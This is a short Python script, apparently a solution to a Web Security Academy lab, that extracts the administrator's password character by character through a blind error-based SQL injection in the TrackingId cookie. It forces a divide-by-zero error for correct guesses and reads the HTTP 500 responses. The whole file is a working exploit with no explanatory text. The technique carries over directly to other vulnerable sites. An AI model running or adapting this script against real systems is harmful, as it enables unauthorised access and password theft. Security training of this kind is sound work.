import requests

r = requests.Session()

url = "https://ac811f2f1e891c5680e7c48f001c0081.web-security-academy.net"

c = 1
leaked_password = ""
i = 32
while (i <= 125):
    char = chr(i)
    if(chr(i) == ';' or i == 39):
        char = '#'
    headers = {
            "Cookie" : "TrackingId=iygAGAmBMd3vdhT0' || (select case when (substr(password, {}, 1) = '{}') then to_char(1/0) else '1' end from users where username='administrator') ||'; session=EvsOlL0YcVtD4DuwstMnwuDKSdBbmGjB".format(c, char)
    }
    response = r.get(url, headers=headers)
    if(response.status_code == 500):
        leaked_password += str(char)
        c += 1
        i = 31
    i += 1
    print(leaked_password + char)
